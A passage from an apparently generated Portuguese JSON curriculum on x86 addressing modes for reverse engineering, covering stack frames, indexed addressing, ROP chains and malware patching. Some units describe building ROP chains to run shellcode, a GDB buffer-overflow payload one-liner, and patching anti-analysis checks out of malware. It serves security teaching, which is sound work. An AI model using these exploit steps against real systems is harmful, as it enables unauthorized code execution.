                                    "Filtre gadgets úteis como 'jmp [rax]; ret' ou 'call [rbx]' em bibliotecas como libc.",
                                    "Use Ropper ou rp++ para visualização gráfica de chains indiretas.",
                                    "Valide gadgets em GDB: set registrador para endereço conhecido e execute.",
                                    "Compile um binário customizado com funções indiretas para prática controlada."
                                  ],
                                  "verification": "Extraia e valide pelo menos 5 gadgets indiretos de um binário real, salvando em arquivo.",
                                  "estimatedTime": "2-3 hours",
                                  "materials": [
                                    "ROPgadget",
                                    "Ropper",
                                    "Binários de CTF (e.g., picoCTF ROP)",
                                    "GDB com gef/pwndbg"
                                  ],
                                  "tips": [
                                    "Procure gadgets em .plt ou seções de código legível.",
                                    "Combine com 'pop reg; ret' para setup de ponteiros."
                                  ],
                                  "learningObjective": "Habilitar detecção precisa de gadgets indiretos para construção de chains ROP avançadas.",
                                  "commonMistakes": [
                                    "Gadgets inválidos devido a bad chars ou ASLR.",
                                    "Não considerar endianness em ponteiros.",
                                    "Overlooking gadgets multi-stage."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir Chains ROP Usando Indireções para Controle de Fluxo",
                                  "subSteps": [
                                    "Planeje chain: pop registrador -> escreva ponteiro para shellcode -> jmp/call indireto.",
                                    "Escreva script Python com pwntools para gerar payload com endereços de gadgets.",
                                    "Teste localmente: buffer overflow para controlar RIP, chain para indireção.",
                                    "Lide com leaks: use info leak para obter endereço de shellcode em memória.",
                                    "Itere depurando falhas de segmentação com 'checksec' para mitigações."
                                  ],
                                  "verification": "Crie e execute uma chain ROP que salte para endereço controlado via indireção, obtendo shell.",
                                  "estimatedTime": "3-4 hours",
                                  "materials": [
                                    "pwntools library",
                                    "Binário vulnerável sem NX/PIE",
                                    "Python 3",
                                    "Netcat para listener"
                                  ],
                                  "tips": [
                                    "Use 'cyclic' para encontrar offset exato.",
                                    "Alinhe shellcode em região RWX como .data."
                                  ],
                                  "learningObjective": "Construir fluxos ROP complexos onde indireções bypassam limitações de gadgets diretos.",
                                  "commonMistakes": [
                                    "Ponteiro desalinhado causando crash.",
                                    "Esquecer ret após pop.",
                                    "Não limpar registradores sujos."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar Indireções para Execução de Shellcode Arbitrário",
                                  "subSteps": [
                                    "Integre shellcode em região heap/stack via write primitives ou leak.",
                                    "Setup chain: leak addr -> pop para reg -> write addr em reg -> jmp [reg].",
                                    "Bypass ASLR/DEP usando partial overwrites ou mprotect via ROP.",
                                    "Teste em ambiente realista com mitigações (PIE, Canary off para foco).",
                                    "Documente chain completa e gere exploit one-liner."
                                  ],
                                  "verification": "Desenvolva exploit full que execute shellcode via ROP indireto em binário protegido.",
                                  "estimatedTime": "4-5 hours",
                                  "materials": [
                                    "Exploit templates pwntools",
                                    "Binários com checksec médio",
                                    "GDB server para remote debug"
                                  ],
                                  "tips": [
                                    "Use ROP para system() ou execve se shellcode bloqueado.",
                                    "Monitore com strace para syscalls."
                                  ],
                                  "learningObjective": "Aplicar indireções ROP para bypassar defesas e executar código arbitrário.",
                                  "commonMistakes": [
                                    "Shellcode em região não-executável.",
                                    "Leak incompleto de ASLR.",
                                    "Stack pivot falho."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário CTF vulnerável a buffer overflow (sem NX), use chain ROP: pop rax; ret (0xdeadbeef onde shellcode está) + jmp [rax]; ret. Payload: offset + rax_addr + shellcode_addr + jmp_indireto_addr. Execução salta para shellcode após setup indireto.",
                              "finalVerifications": [
                                "Identificar e listar 10+ gadgets indiretos em qualquer binário fornecido.",
                                "Construir chain ROP funcional para jmp indireto em <30 min.",
                                "Exploit shellcode via indireção em binário com ASLR off.",
                                "Debugar e corrigir crashes em chains indiretas usando GDB.",
                                "Explicar como indireções evitam detecção por ROP mitigators.",
                                "Gerar payload pwntools para cenário realista."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gadgets indiretos (90% válidos).",
                                "Funcionalidade do exploit: shell interativo via indireção.",
                                "Eficiência da chain: <20 gadgets, sem leaks desnecessários.",
                                "Robustez: funciona com variações de ASLR/offsets.",
                                "Documentação: chain explicada com diagramas de pilha.",
                                "Criatividade: bypass de pelo menos uma mitgação extra."
                              ],
                              "crossCurricularConnections": [
                                "Análise Reversa: Disassembly e debugging em GDB.",
                                "Arquitetura Computacional: Registradores e memória x86.",
                                "Sistemas Operacionais: Syscalls e mapeamento de memória.",
                                "Programação Competitiva: Scripts pwntools para automação.",
                                "Criptografia: Leaks de ponteiros em ataques side-channel."
                              ],
                              "realWorldApplication": "Em pentests e CTFs (e.g., DEF CON, pwn.college), indireções ROP são usadas para exploits em binários legacy sem W^X, como servers IoT vulneráveis, permitindo RCE remota via buffer overflows controlados por atacantes."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.3.3",
                        "name": "Modo de Endereçamento Baseado",
                        "description": "O modo baseado soma um registrador base (como EBP ou RBP) a um deslocamento imediato para formar o endereço, comum em acessos a stack frames e estruturas.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.3.3.1",
                            "name": "Detectar uso de base em frames de pilha",
                            "description": "Analisar instruções como MOV eax, [ebp + 0x8] em funções desmontadas, relacionando com parâmetros e variáveis locais em análise de binários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Estrutura do Frame de Pilha em x86",
                                  "subSteps": [
                                    "Estude o layout padrão do stack frame: EBP aponta para o antigo EBP, acima dele return address, depois parâmetros (offsets positivos), abaixo variáveis locais (offsets negativos).",
                                    "Identifique o prologue da função: push ebp; mov ebp, esp.",
                                    "Revise o epilogue: mov esp, ebp; pop ebp; ret.",
                                    "Anote convenções de chamada como stdcall ou cdecl e seu impacto nos parâmetros.",
                                    "Desenhe um diagrama do stack frame com offsets exemplo: [ebp-4] para local var, [ebp+8] para primeiro param."
                                  ],
                                  "verification": "Crie um diagrama manual do stack frame e explique offsets para 3 variáveis locais e 2 parâmetros.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação Intel x86 manuals, diagramas de stack frame online (ex: OpenRCE ou Feluda's blog).",
                                  "tips": "Sempre comece pelo prologue para confirmar uso de frame-based.",
                                  "learningObjective": "Dominar o layout conceitual do stack frame usando EBP como base.",
                                  "commonMistakes": "Confundir ESP com EBP; ignorar alinhamento de stack (geralmente 4 ou 8 bytes)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Instruções de Modo Baseado em EBP",
                                  "subSteps": [
                                    "Carregue um binário desmontado em ferramenta como IDA Pro ou Ghidra.",
                                    "Procure padrões: MOV reg, [ebp + offset], PUSH [ebp - offset], LEA reg, [ebp + offset].",
                                    "Destaque instruções onde base é EBP e disp é um offset imediato.",
                                    "Ignore usos de ESP direto ou outras bases como EBX.",
                                    "Registre frequência em uma função: conte acessos [ebp +/- N]."
                                  ],
                                  "verification": "Liste 5 instruções de exemplo de um disassembly com [ebp + offset] anotadas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "IDA Free, Ghidra, binários de teste como crackme ou samples do FLARE-ON.",
                                  "tips": "Use busca por string 'ebp' no disassembly para filtrar rápido.",
                                  "learningObjective": "Reconhecer sintaticamente instruções baseadas em frame de pilha.",
                                  "commonMistakes": "Confundir com acessos absolutos [0x123456] ou base+index."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Offsets para Parâmetros e Variáveis Locais",
                                  "subSteps": [
                                    "Calcule offsets: parâmetros em [ebp + 8] (1º, após return addr + old EBP), [ebp + 12] (2º), etc.",
                                    "Variáveis locais: [ebp - 4] (1ª), [ebp - 8] (2ª), considerando tamanho (DWORD=4 bytes).",
                                    "Correlacione com chamadas de função: trace parâmetros passados via PUSH.",
                                    "Identifique alocações: sub esp, N indica tamanho de locals; divida por 4 para count.",
                                    "Anote em comentários no disassembly: 'arg1: [ebp+8]', 'local_buf: [ebp-0x20]'."
                                  ],
                                  "verification": "Para uma função, mapeie todos acessos [ebp] para nomes lógicos (args/locals).",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Binário com funções conhecidas (ex: compilado de C simples), debugger como x64dbg.",
                                  "tips": "Some 8 ao offset positivo para pular old EBP + ret addr.",
                                  "learningObjective": "Interpretar offsets numericamente em contexto semântico.",
                                  "commonMistakes": "Esquecer old EBP (off-by-4); assumir ordem errada de params."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar Detecção em Análise de Binários Completa",
                                  "subSteps": [
                                    "Analise uma função inteira: trace fluxos de [ebp] acessos do prologue ao epilogue.",
                                    "Compare com pseudocódigo gerado por decompiladores (Ghidra/IDA).",
                                    "Simule execução: use debugger para ver valores em breakpoints nos acessos.",
                                    "Identifique variações: frames omitidos ou EBP não usado (flat frames).",
                                    "Documente relatório: 'Função usa base EBP; 3 params, 5 locals detectados'."
                                  ],
                                  "verification": "Gere relatório de 1 função com mapeamento correto validado por debug.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "x64dbg ou OllyDbg, binários malware samples (VirusTotal safe).",
                                  "tips": "Set breakpoint no prologue; step through para observar stack.",
                                  "learningObjective": "Aplicar detecção holisticamente em cenários reais de RE.",
                                  "commonMistakes": "Não validar com runtime; assumir sem checar prologue."
                                }
                              ],
                              "practicalExample": "Em disassembly: push ebp; mov ebp, esp; sub esp, 20h; mov eax, [ebp+8]; mov [ebp-4], eax; ... ret. Aqui, [ebp+8] é 1º arg (parametro), [ebp-4] é 1ª local var (armazenando arg).",
                              "finalVerifications": [
                                "Identifica corretamente prologue/epilogue em 90% das funções testadas.",
                                "Mapeia offsets para args/locals sem erros de cálculo em exemplos dados.",
                                "Distingue frame EBP de outros modos (ESP direto, registradores).",
                                "Valida via debugger: valores em [ebp+offset] match com pushes prévios.",
                                "Documenta análise com diagramas e comentários precisos.",
                                "Detecta frames não-padrão (ex: sem sub esp)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de instruções base-EBP (>95%).",
                                "Correção no mapeamento de offsets (zero erros em 10 funções).",
                                "Velocidade: analisa função média em <5 min.",
                                "Explicação clara de raciocínio em relatório.",
                                "Adaptabilidade a variações (64-bit, ARM equivalente).",
                                "Integração com análise maior (ex: ROP chains)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender ABI e calling conventions.",
                                "Sistemas Operacionais: Gerenciamento de stack e proteção (ASLR, DEP).",
                                "Engenharia Reversa: Decompilação e análise estática/dinâmica.",
                                "Criptografia: Análise de binários crypto para side-channels."
                              ],
                              "realWorldApplication": "Em análise de malware, detecta manipulação de stack para exploits (buffer overflows); em RE de software proprietário, recupera estruturas de dados locais/params para engenharia de patches ou detecção de backdoors."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.3.2",
                            "name": "Calcular offsets baseados em runtime",
                            "description": "Simular valores de registradores base durante depuração dinâmica com GDB para prever acessos em exploits de buffer overflow.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de depuração com GDB",
                                  "subSteps": [
                                    "Compilar um binário vulnerável em C com símbolos de debug usando 'gcc -g -fno-stack-protector -z execstack -o vuln vuln.c'.",
                                    "Verificar a vulnerabilidade de buffer overflow no código fonte, identificando uso de registradores base como EBP ou RBP.",
                                    "Iniciar o GDB com 'gdb ./vuln' e configurar breakpoints em funções críticas como main ou a função vulnerável.",
                                    "Executar o programa até o breakpoint com 'run' e inspecionar o stack inicial com 'info registers'."
                                  ],
                                  "verification": "Confirme que o GDB está rodando, breakpoints estão setados e registradores iniciais são visíveis com 'info registers'.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": "GCC compiler, GDB debugger, código fonte C vulnerável a buffer overflow.",
                                  "tips": "Sempre compile com -g para símbolos e desative proteções como ASLR temporariamente com 'set disable-randomization on'.",
                                  "learningObjective": "Configurar corretamente um ambiente de depuração dinâmica para análise de runtime.",
                                  "commonMistakes": "Esquecer símbolos de debug (-g), resultando em endereços ilegíveis; ativar proteções de stack desnecessariamente."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Inspecionar valores de registradores base durante runtime",
                                  "subSteps": [
                                    "Executar o input que causa overflow com 'run <input>' ou interativamente.",
                                    "No breakpoint, usar 'info registers ebp' ou 'print $ebp' para capturar valor do registrador base.",
                                    "Examinar o stack frame com 'x/20wx $esp' ou 'x/20gx $rsp' para mapear offsets relativos ao base.",
                                    "Usar 'disassemble' na função para correlacionar instruções de acesso baseado (ex: [ebp-0x10]).",
                                    "Anotar valores dinâmicos de EBP/RBP e ESP/RSP em diferentes execuções."
                                  ],
                                  "verification": "Registre valores consistentes de registradores base em múltiplas runs e visualize stack corretamente.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": "GDB session ativa, input de teste para triggerar overflow.",
                                  "tips": "Use 'tui enable' para interface gráfica no GDB, facilitando visualização de registradores e assembly.",
                                  "learningObjective": "Capturar e interpretar valores reais de registradores base em execução dinâmica.",
                                  "commonMistakes": "Confundir registradores (EBP vs ESP); ignorar ASLR, assumindo endereços estáticos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Calcular offsets baseados em valores de runtime",
                                  "subSteps": [
                                    "Baseado no valor de EBP capturado (ex: 0xbffffxxx), calcular offset para variáveis locais: offset = endereço_var - EBP.",
                                    "Simular acessos com 'print *(int*)($ebp - 0x10)' para prever conteúdo em offsets específicos.",
                                    "Modelar o stack frame: saved EBP em [EBP], retorno em [EBP+4], parâmetros em [EBP+8].",
                                    "Testar predições alterando memória com 'set {int}($ebp - 0x10) = 0xdeadbeef' e verificando.",
                                    "Documentar fórmula: endereço_acesso = base_reg + offset_relativo."
                                  ],
                                  "verification": "Calcule e acerte pelo menos 3 offsets corretos, confirmados via print no GDB.",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": "Valores anotados de registradores, calculadora hexadecimal ou 'gdb-python' para scripts.",
                                  "tips": "Trabalhe em hex sempre: use 'x/xw' para words; pratique com 'info frame' para detalhes do stack.",
                                  "learningObjective": "Aplicar aritmética de endereços para calcular offsets dinâmicos precisos.",
                                  "commonMistakes": "Erro de sinal em offsets (negativo para locals); esquecer endianness em multi-byte acessos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular e prever acessos em exploit de buffer overflow",
                                  "subSteps": [
                                    "Construir payload: junk + offset_to_ret + shellcode, usando offset calculado (ex: 28 bytes para EBP).",
                                    "Injetar payload via 'run $(python -c \"print 'A'*28 + '\\xef\\xbe\\xad\\de'\")' e observar overwrite.",
                                    "Prever controle de EIP: calcule onde payload sobresscreve [EBP+4] baseado em runtime EBP.",
                                    "Verificar sucesso com 'continue' e observação de registradores pós-overflow.",
                                    "Iterar refinando offsets com múltiplos testes."
                                  ],
                                  "verification": "Execute exploit com predição correta, controlando EIP como esperado.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": "Payload generator (Python), GDB com breakpoint no retorno.",
                                  "tips": "Use cyclic patterns ('cyclic 100' via pwntools) para encontrar offsets exatos automaticamente.",
                                  "learningObjective": "Integrar cálculos de runtime para crafting efetivo de exploits.",
                                  "commonMistakes": "Offset fixo sem runtime (falha por ASLR); null bytes no payload quebrando string input."
                                }
                              ],
                              "practicalExample": "Em um binário 'vuln.c' com 'char buf[64]; gets(buf);', depure com GDB. Runtime EBP=0xbffff7d8. Local var em EBP-0x3c. Payload: 60*'A' + p32(0xdeadbeef) overwrite ret addr em EBP+4=0xbffff7dc, prevendo EIP=0xdeadbeef.",
                              "finalVerifications": [
                                "Calcula offset correto para EBP em pelo menos 3 execuções diferentes.",
                                "Simula acesso [EBP - 0x20] retornando valor esperado.",
                                "Constrói payload que overwrite EIP baseado em runtime base.",
                                "Prediz stack layout completo (locals, saved EBP, ret addr).",
                                "Verifica com GDB que predições batem com observações reais.",
                                "Ajusta offsets para variações menores em runtime."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos cálculos de offset (erro < 4 bytes).",
                                "Correta interpretação de registradores base (EBP/RBP).",
                                "Sucesso em simulação de acessos via GDB prints/sets.",
                                "Payload funcional que explora overflow prevendo runtime.",
                                "Documentação clara de valores runtime e fórmulas.",
                                "Eficiência: completa em <90 minutos com <2 falhas graves."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Assembly: Leitura de instruções baseadas como mov eax, [ebp-4].",
                                "Depuração Dinâmica: Uso avançado de GDB/PEDA/gef.",
                                "Exploração de Vulnerabilidades: ROP chains e shellcoding.",
                                "Arquitetura de Computadores: Stack frames e calling conventions."
                              ],
                              "realWorldApplication": "Em pentesting, calcular offsets runtime permite bypass de ASLR/DEP em exploits reais, como em CTFs (pwn challenges) ou análise de binários legacy sem PIE, prevendo overwrites precisos para RCE em serviços vulneráveis."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.3.3",
                            "name": "Modificar fluxos baseados em engenharia reversa",
                            "description": "Alterar offsets baseados em editores hexadecimais ou patchers para bypass de controles de fluxo em malwares analisados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar controles de fluxo no binário analisado",
                                  "subSteps": [
                                    "Carregue o binário em uma ferramenta de desassembly como IDA Pro ou Ghidra.",
                                    "Analise o grafo de controle de fluxo para identificar branches condicionais (ex: JNZ, JE).",
                                    "Marque offsets suspeitos de anti-análise, como checks de debugger ou licença.",
                                    "Documente o contexto assembly ao redor do controle (próximas instruções e registradores envolvidos).",
                                    "Exporte o mapa de offsets para referência futura."
                                  ],
                                  "verification": "Confirme a presença de pelo menos 3 controles de fluxo identificados com offsets anotados em um relatório ou screenshot.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "IDA Pro ou Ghidra",
                                    "Binário de malware sample (ex: EICAR ou amostra controlada)",
                                    "Notepad++ para anotações"
                                  ],
                                  "tips": "Use breakpoints dinâmicos em debuggers como x64dbg para confirmar execução do branch.",
                                  "learningObjective": "Entender estruturas de controle de fluxo em binários e localizá-las via desassembly estático.",
                                  "commonMistakes": "Ignorar controles indiretos via chamadas de API ou tabelas de jump; confundir offsets relativos com absolutos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Realizar engenharia reversa detalhada para mapear offsets precisos",
                                  "subSteps": [
                                    "Execute o binário em um debugger (x64dbg ou OllyDbg) para rastrear execução dinâmica.",
                                    "Defina breakpoints nos offsets identificados e observe registradores/flags (ZF, CF).",
                                    "Renomeie funções e labels no desassembly para clareza (ex: 'anti_debug_check').",
                                    "Simule cenários de bypass manualmente alterando flags no debugger.",
                                    "Calcule offsets exatos considerando ASLR/relocações se aplicável."
                                  ],
                                  "verification": "Gere um log de execução mostrando o hit no breakpoint e valores de registradores/flags alterados.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "x64dbg ou OllyDbg",
                                    "VM isolada para execução segura",
                                    "Scripts de Python para automação de breakpoints"
                                  ],
                                  "tips": "Ative tracing de execução para visualizar caminhos alternativos sem modificar o binário ainda.",
                                  "learningObjective": "Mapear dinamicamente offsets e comportamentos de controles de fluxo em runtime.",
                                  "commonMistakes": "Executar fora de sandbox, levando a infecção; não considerar packing/obfuscation inicial."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar modificações nos offsets usando editores hex ou patchers",
                                  "subSteps": [
                                    "Abra o binário em HxD ou 010 Editor para edição hex.",
                                    "Localize o offset exato (ex: byte 0x74 para JZ) e substitua por NOP (0x90) ou JMP incondicional (0xEB).",
                                    "Use patchers como QuickBMS ou Cheat Engine para mods scriptáveis se múltiplos offsets.",
                                    "Salve uma cópia backup e verifique checksum antes/depois.",
                                    "Reassemble se necessário via NASM para instruções customizadas."
                                  ],
                                  "verification": "Compare diff hex antes/depois mostrando apenas os bytes alterados nos offsets alvo.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "HxD ou 010 Editor",
                                    "QuickBMS ou Cheat Engine",
                                    "Calculadora hex para conversões"
                                  ],
                                  "tips": "Sempre edite em little-endian; teste tamanhos de instrução para evitar overlaps.",
                                  "learningObjective": "Executar patches precisos em binários sem corromper estrutura geral.",
                                  "commonMistakes": "Sobrescrever bytes adjacentes, causando crashes; ignorar alinhamento de instruções."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e validar o bypass do controle de fluxo",
                                  "subSteps": [
                                    "Execute o binário patchado em debugger/VM e monitore se o branch é bypassed.",
                                    "Verifique logs de comportamento (ex: payload descriptografado agora acessível).",
                                    "Compare execução original vs. patchada via strace ou ProcMon.",
                                    "Teste robustez: varie inputs/ambientes para false positives.",
                                    "Documente sucesso com screenshots de desassembly e runtime."
                                  ],
                                  "verification": "Demonstre execução bem-sucedida sem ativação do controle (ex: sem pop-up anti-debug).",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "VMware/VirtualBox isolada",
                                    "ProcMon ou Wireshark para monitoramento",
                                    "Relatório template"
                                  ],
                                  "tips": "Use snapshots de VM para reverter testes falhos rapidamente.",
                                  "learningObjective": "Validar efetividade de mods em cenários reais de análise.",
                                  "commonMistakes": "Não testar em múltiplas arquiteturas (x86/x64); assumir bypass sem verificação dinâmica."
                                }
                              ],
                              "practicalExample": "Em um malware ransomware sample com check anti-VM (instrução JNZ em offset 0x40123B), altere para NOPs múltiplos para forçar descriptografia do payload, permitindo análise estática sem execução maliciosa.",
                              "finalVerifications": [
                                "Binário patchado executa sem disparar o controle original (confirmado via debugger).",
                                "Offsets modificados permanecem íntegros pós-reload em múltiplas ferramentas.",
                                "Comportamento pós-bypass matches expected (ex: strings ocultas reveladas).",
                                "Nenhum crash ou detecção de integridade (ex: CRC checks bypassed).",
                                "Relatório inclui before/after diffs e logs de teste.",
                                "Reversão possível restaurando backup original."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de offsets (sem falsos positivos).",
                                "Qualidade da documentação de steps e verificações.",
                                "Sucesso no bypass sem side-effects (crashes ou detecções novas).",
                                "Eficiência temporal (dentro de estimados).",
                                "Uso correto de ferramentas sem violações de segurança.",
                                "Criatividade em handling de edge cases (obfuscation)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly: Entender opcodes e flags.",
                                "Análise de Malware: Integra com unpacking e behavioral analysis.",
                                "Debugging Avançado: Skills de breakpoints e patching dinâmico.",
                                "Segurança de Software: Conceitos de control flow integrity (CFI).",
                                "Engenharia de Sistemas: Memória e modos de endereçamento."
                              ],
                              "realWorldApplication": "Em equipes de Threat Hunting/Incident Response, patchar controles anti-análise em malwares reais permite extração segura de IOCs, C2s e payloads para mitigação em ambientes corporativos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.3.4",
                        "name": "Modo de Endereçamento Indexado",
                        "description": "Combina um registrador base, índice e escala (como [base + index * scale + disp]) para acessos eficientes a arrays e estruturas complexas em memória.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.3.4.1",
                            "name": "Identificar sintaxe indexada completa",
                            "description": "Reconhecer formas como MOV eax, [esi + ecx*4 + 0x10] em x86-64, comum em loops de processamento de dados em binários ELF.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os componentes básicos do modo de endereçamento indexado",
                                  "subSteps": [
                                    "Revise a sintaxe geral: [base + index * scale + displacement]",
                                    "Identifique cada parte: base (ex: esi), index (ex: ecx), scale (ex: 4), displacement (ex: 0x10)",
                                    "Estude exemplos simples como [esi + ecx*4] e evolua para completos",
                                    "Consulte a documentação Intel x86-64 para ModR/M byte",
                                    "Anote diferenças entre x86 e x86-64"
                                  ],
                                  "verification": "Liste corretamente os 4 componentes em um diagrama anotado de um exemplo",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Documentação Intel x86-64 Volume 2, notepad para diagramas",
                                  "tips": "Use cores para destacar cada componente na sintaxe",
                                  "learningObjective": "Dominar a decomposição da sintaxe indexada em partes atômicas",
                                  "commonMistakes": "Confundir scale com displacement ou ignorar o colchete []"
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Reconhecer a sintaxe completa em instruções MOV",
                                  "subSteps": [
                                    "Analise MOV eax, [esi + ecx*4 + 0x10] token por token",
                                    "Identifique o registrador destino (eax) e a forma de endereço fonte",
                                    "Pratique parsing manual: base=esi, index=ecx, scale=4, disp=0x10",
                                    "Compare com variações: sem scale, sem disp, negativo disp",
                                    "Desmonte um binário ELF simples com objdump para observar"
                                  ],
                                  "verification": "Parse 5 exemplos variados corretamente em uma tabela",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Objdump ou Ghidra, binário ELF de teste com loop indexado",
                                  "tips": "Leia da esquerda para direita, mas valide com ModR/M em hexdump",
                                  "learningObjective": "Identificar precisamente a sintaxe indexada completa em MOV",
                                  "commonMistakes": "Interpretar * como multiplicação direta sem scale implícito (1,2,4,8)"
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar em contextos de loops de processamento de dados",
                                  "subSteps": [
                                    "Examine código desmontado de loops array em binários ELF",
                                    "Identifique padrões: ecx como contador, esi base array, *4 para int32",
                                    "Trace execução: calcule endereço efetivo para valores sample",
                                    "Diferencie de outros modos (base+disp vs indexado)",
                                    "Use debugger para step-through e validar"
                                  ],
                                  "verification": "Trace um loop indexado e calcule 3 endereços corretos",
                                  "estimatedTime": "30 minutos",
                                  "materials": "GDB ou x64dbg, binário ELF com loop array",
                                  "tips": "Inicie GDB com 'gdb ./binary' e 'disassemble main'",
                                  "learningObjective": "Contextualizar sintaxe indexada em cenários reais de binários",
                                  "commonMistakes": "Confundir com RIP-relative em x86-64 ou modos não-indexados"
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar identificação e validação em binários reais",
                                  "subSteps": [
                                    "Desmonte 3 binários ELF diferentes com objdump -d",
                                    "Marque todas ocorrências de sintaxe indexada completa",
                                    "Valide com cálculo manual de endereço em runtime via debugger",
                                    "Crie um checklist para confirmação rápida",
                                    "Registre falsos positivos de outros modos"
                                  ],
                                  "verification": "Identifique e valide 10 instâncias em binários variados",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Objdump, GDB, amostras de binários ELF (ex: de CTFs)",
                                  "tips": "Filtre com 'objdump -d binary | grep \"\\[.*+.*\\*\"'",
                                  "learningObjective": "Desenvolver fluência na detecção automatizada e manual",
                                  "commonMistakes": "Ignorar sintaxe com parênteses ou assembler variants (AT&T)"
                                }
                              ],
                              "practicalExample": "Em um binário ELF de um loop processando array de inteiros: 'mov eax, [esi + ecx*4 + 0x10]' onde esi aponta para buffer base, ecx é índice do loop (0 a N), *4 escala para sizeof(int), 0x10 é offset header. Calcula endereço: base + (index << 2) + 16.",
                              "finalVerifications": [
                                "Parse correto de 5 exemplos complexos sem erros",
                                "Cálculo preciso de endereço efetivo em debugger",
                                "Identificação de 10+ ocorrências em binário real",
                                "Diferenciação de modos indexado vs base+disp",
                                "Explicação verbal do papel em loops de dados",
                                "Checklist pessoal de validação criado e testado"
                              ],
                              "assessmentCriteria": [
                                "Precisão na decomposição (base/index/scale/disp): 100%",
                                "Velocidade de identificação em desmontado (>90% em <10s)",
                                "Validação via debugger sem discrepâncias",
                                "Compreensão contextual em loops ELF",
                                "Ausência de confusão com outros modos",
                                "Criação de exemplos próprios válidos"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender arrays como indexação scaled",
                                "Arquitetura de Computadores: ModR/M encoding e ALU ops",
                                "Segurança: Buffer overflows em loops indexados",
                                "Análise Reversing: Padrões em malware loaders"
                              ],
                              "realWorldApplication": "Em análise de malware, identificar loops indexados em ELF para detectar decryptors de payloads ou parsers de dados infectados, permitindo hooks em endereços dinâmicos para detecção comportamental."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.4.2",
                            "name": "Analisar escalas em acessos a arrays",
                            "description": "Determinar tamanhos de elementos via escala (1,2,4,8) para mapear estruturas de dados em memória durante reversão estática.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Modos de Endereçamento Indexado e Escalas",
                                  "subSteps": [
                                    "Estude a sintaxe de endereçamento indexado em assembly x86/x64, como [base + index * scale + displacement].",
                                    "Identifique as escalas permitidas: 1, 2, 4 ou 8, que representam multiplicadores para o registrador de índice.",
                                    "Revise como o compilador usa escalas para acessar arrays e estruturas alinhadas em memória.",
                                    "Analise exemplos de código C que geram acessos indexados, como arrays de int ou structs.",
                                    "Pratique decodificando instruções simples em um desmontador."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como uma escala de 4 indica acesso a elementos de 4 bytes.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Intel x86 manuals (Volume 2)",
                                    "Ghidra ou IDA Freeware",
                                    "Exemplos de código C compilado"
                                  ],
                                  "tips": "Comece com instruções MOV simples; foque em operandos de memória.",
                                  "learningObjective": "Dominar a sintaxe e o propósito das escalas em endereçamento indexado.",
                                  "commonMistakes": [
                                    "Confundir scale com displacement.",
                                    "Ignorar alinhamento de dados.",
                                    "Assumir escalas arbitrárias além de 1,2,4,8."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Padrões de Escalas em Instruções de Assembly",
                                  "subSteps": [
                                    "Carregue um binário de exemplo em um desmontador e localize funções com loops ou acessos sequenciais.",
